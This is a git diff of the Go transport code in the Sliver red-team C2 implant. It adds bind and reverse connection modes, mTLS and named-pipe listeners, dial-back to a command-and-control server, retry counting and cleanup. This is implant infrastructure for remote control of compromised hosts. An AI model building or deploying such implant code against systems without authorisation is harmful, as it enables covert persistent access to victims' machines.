@@ -23,34 +23,33 @@ import (
 	"log"
 	// {{end}}
 
+	"errors"
 	"fmt"
 	"net"
 	"net/url"
 	"os"
 	"os/user"
 	"runtime"
+	"strings"
 	"time"
-
-	// {{if .Config.MTLSc2Enabled}}
-
-	// {{end}}
 
 	"github.com/golang/protobuf/proto"
 
+	"github.com/bishopfox/sliver/protobuf/commpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/sliver/comm"
 	consts "github.com/bishopfox/sliver/sliver/constants"
 	"github.com/bishopfox/sliver/sliver/version"
 )
 
 // Transport - A wrapper around a physical connection, embedding what is necessary to perform
 // connection multiplexing, and RPC layer management around these muxed logical streams.
-// This allows to have different RPC-able streams for parallel work on an implant.
-// Also, these multiplexed streams can be used to route any net.Conn traffic.
-// Some transports use an underlying "physical connection" that is not/does not yield a
-// net.Conn stream, and are therefore unable to use much of the Transport infrastructure.
 type Transport struct {
-	ID  uint32
-	URL *url.URL // URL is used by Sliver's code for CC servers.
+	ID        uint32
+	Type      commpb.HandlerType // Direction of communications
+	URL       *url.URL           // URL is used by Sliver's code for CC servers.
+	maxErrors int                // Errors allowed
+	attempts  int                // Attempts are reset once max errors is reached and exit.
 
 	// conn - A physical connection initiated by/on behalf of this transport.
 	// From this conn will be derived one or more streams for different purposes.
@@ -65,29 +64,128 @@ type Transport struct {
 	// If the Transport is the ActiveConnection to the C2 server, this cannot
 	// be nil, as all underlying transports allow to register a RPC layer.
 	C2 *Connection
+
+	// Comm - Each transport over which a Session Connection (above) is working also
+	// has a Comm system object, that is referenced here so that when the transport
+	// is cut/switched/close, we can close the Comm subsystem and its connections.
+	Comm *comm.Comm
 }
 
-// newTransport - Eventually, we should have all supported transport transports being
+// NewTransport - Eventually, we should have all supported transport transports being
 // instantiated with this function. It will perform all filtering and setup
 // according to the complete URI passed as parameter, and classic templating.
-func newTransport(url *url.URL) (t *Transport, err error) {
+func NewTransport(url *url.URL) (t *Transport, err error) {
 	t = &Transport{
 		ID:  newID(),
 		URL: url,
 	}
+
+	// Depending on the specified (or not) handler type, we set the transport direction.
+	scheme := strings.Split(url.Scheme, "+")
+	// If two parts, normally we have bind or reverse
+	if len(scheme) == 2 {
+		if scheme[0] == commpb.HandlerType_Bind.String() {
+			t.Type = commpb.HandlerType_Bind
+		}
+		if scheme[0] == commpb.HandlerType_Reverse.String() {
+			t.Type = commpb.HandlerType_Reverse
+		}
+	}
+
+	// If one part and that part is a protocol, automatically use reverse
+	invalidType := scheme[0] != commpb.HandlerType_Bind.String() && scheme[0] != commpb.HandlerType_Reverse.String()
+	if len(scheme) == 1 && invalidType {
+		t.Type = commpb.HandlerType_Reverse
+	}
+
+	// Default max errors
+	t.maxErrors = maxErrors
+
 	// {{if .Config.Debug}}
-	log.Printf("New transport (CC= %s)", url.String())
+	log.Printf("New transport (Type: %s, CC= %s)", t.Type.String(), url.String())
 	// {{end}}
 	return
 }
 
-// Start - Launch all components and routines that will handle all specifications above.
-func (t *Transport) Start(isSwitch bool) (err error) {
+// start - The transport either listens (bind) on an address and blocks until the implant RPC session
+// is established, or it dials (reverse) the server back and also sets the implant RPC session before return.
+func (t *Transport) start() (err error) {
+	switch t.Type {
+	case commpb.HandlerType_Bind:
+		return t.startBind()
+	case commpb.HandlerType_Reverse:
+		return t.startReverse()
+	}
+	return errors.New("invalid transport direction")
+}
 
-	connectionAttempts := 0
+// startBind - When the transport is a bind one, we start to listen over the given URL
+// and transport protocol. Each listening function is blocking and sets the RPC layer
+// on its own, before returning either a working implant connection, or an error.
+func (t *Transport) startBind() (err error) {
+
+	// {{if .Config.Debug}}
+	log.Printf("Listening (bind) on %s (%s)", t.URL.Host, t.URL.Scheme)
+	// {{end}}
 
 ConnLoop:
-	for connectionAttempts < maxErrors {
+	for t.attempts < t.maxErrors {
+		switch t.URL.Scheme {
+		// {{if .Config.MTLSc2Enabled}}
+		case "mtls":
+			// {{if .Config.Debug}}
+			log.Printf("Listening on %s", t.URL.Host)
+			// {{end}}
+
+			t.C2, err = listenMTLS(t.URL)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[mtls] Connection failed: %s", err)
+				// {{end}}
+				t.attempts++
+			}
+			break ConnLoop
+			// {{end}} - MTLSc2Enabled
+
+		case "namedpipe", "named_pipe", "pipe":
+			// {{if .Config.NamePipec2Enabled}}
+			t.C2, err = namedPipeListen(t.URL)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[namedpipe] Connection failed: %s", err)
+				// {{end}}
+				t.attempts++
+			}
+			break ConnLoop
+			// {{end}} -NamePipec2Enabled
+		default:
+			break ConnLoop // Avoid ConnLoop not used
+		}
+	}
+
+	if t.C2 == nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to connect over bind (listener) transport %d (%s)", t.ID, t.URL)
+		// {{end}}
+		return
+	}
+
+	// {{if .Config.Debug}}
+	log.Printf("Transport %d set up and running (%s)", t.ID, t.URL)
+	// {{end}}
+
+	return
+}
+
+// startReverse - The implant dials back a C2 server.
+func (t *Transport) startReverse() (err error) {
+
+	// {{if .Config.Debug}}
+	log.Printf("Connecting (reverse) -> %s (%s)", t.URL.Host, t.URL.Scheme)
+	// {{end}}
+
+ConnLoop:
+	for t.attempts < t.maxErrors {
 
 		// We might have several transport protocols available, while some
 		// of which being unable to do stream multiplexing (ex: mTLS + DNS):
@@ -100,20 +198,12 @@ ConnLoop:
 			log.Printf("Connecting -> %s", t.URL.Host)
 			// {{end}}
 
-			// lport, err := strconv.Atoi(t.URL.Port())
-			// if err != nil {
-			//         // {{if .Config.Debug}}
-			//         log.Printf("[mtls] Error: failed to parse url.Port%s", t.URL.Host)
-			//         // {{end}}
-			//         lport = 8888
-			// }
 			t.C2, err = mtlsConnect(t.URL)
-			// t.Conn, err = tlsConnect(t.URL.Hostname(), uint16(lport))
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[mtls] Connection failed: %s", err)
 				// {{end}}
-				connectionAttempts++
+				t.attempts++
 			}
 			break ConnLoop
 			// {{end}} - MTLSc2Enabled
@@ -124,7 +214,7 @@ ConnLoop:
 				// {{if .Config.Debug}}
 				log.Printf("[dns] Connection failed: %s", err)
 				// {{end}}
-				connectionAttempts++
+				t.attempts++
 			}
 			break ConnLoop
 			// {{end}} - DNSc2Enabled
@@ -137,18 +227,18 @@ ConnLoop:
 				// {{if .Config.Debug}}
 				log.Printf("[%s] Connection failed: %s", t.URL.Scheme, err.Error())
 				// {{end}}
-				connectionAttempts++
+				t.attempts++
 			}
 			break ConnLoop
 			// {{end}} - HTTPc2Enabled
 		case "namedpipe":
 			// {{if .Config.NamePipec2Enabled}}
-			t.Conn, err = namePipeDial(t.URL)
+			t.C2, err = namedPipeDial(t.URL)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[namedpipe] Connection failed: %s", err)
 				// {{end}}
-				connectionAttempts++
+				t.attempts++
 			}
 			break ConnLoop
 			// {{end}} -NamePipec2Enabled
@@ -159,7 +249,7 @@ ConnLoop:
 				// {{if .Config.Debug}}
 				log.Printf("[tcppivot] Connection failed: %s", err)
 				// {{end}}
-				connectionAttempts++
+				t.attempts++
 			}
 			break ConnLoop
 			// {{end}} -TCPPivotc2Enabled
@@ -172,6 +262,13 @@ ConnLoop:
 		}
 	}
 
+	if t.C2 == nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to start transport %d (%s)", t.ID, t.URL)
+		// {{end}}
+		return
+	}
+
 	// {{if .Config.Debug}}
 	log.Printf("Transport %d set up and running (%s)", t.ID, t.URL)
 	// {{end}}
@@ -180,16 +277,16 @@ ConnLoop:
 
 // Stop - Gracefully shutdowns all components of this transport. The force parameter is used in case
 // we have a mux transport, and that we want to kill it even if there are pending streams in it.
-func (t *Transport) Stop(force bool) (err error) {
-
-	if t.IsRouting() && !force {
-		return
-		// return fmt.Errorf("Cannot stop transport: %d streams still opened", t.mux.NumStreams())
-	}
+func (t *Transport) Stop() (err error) {
 
 	// {{if .Config.Debug}}
-	log.Printf("[mux] closing all muxed streams")
+	log.Printf("Closing transport %d (CC: %s)", t.ID, t.URL.String())
 	// {{end}}
+
+	// Close the RPC connection per se.
+	if t.C2 != nil {
+		t.C2.Cleanup()
+	}
 
 	// Just check the physical connection is not nil and kill it if necessary.
 	if t.Conn != nil {
@@ -203,23 +300,6 @@ func (t *Transport) Stop(force bool) (err error) {
 	log.Printf("Transport closed (%s)", t.URL.String())
 	// {{end}}
 	return
-}
-
-// IsRouting - The transport checks if it is routing traffic that does not originate from this implant.
-func (t *Transport) IsRouting() bool {
-
-	// if t.IsMux {
-	//         activeStreams := t.mux.NumStreams()
-	//         // If there is an active C2, there is at least one open stream,
-	//         // that we do not count as "important" when stopping the Transport.
-	//         if (t.C2 != nil && activeStreams > 1) || (t.C2 == nil && activeStreams > 0) {
-	//                 return true
-	//         }
-	//         // Else we don't have any non-implant streams.
-	//         return false
-	// }
-	// If no mux, no routing.
-	return false
 }
 
 func (t *Transport) registerSliver() *sliverpb.Envelope {
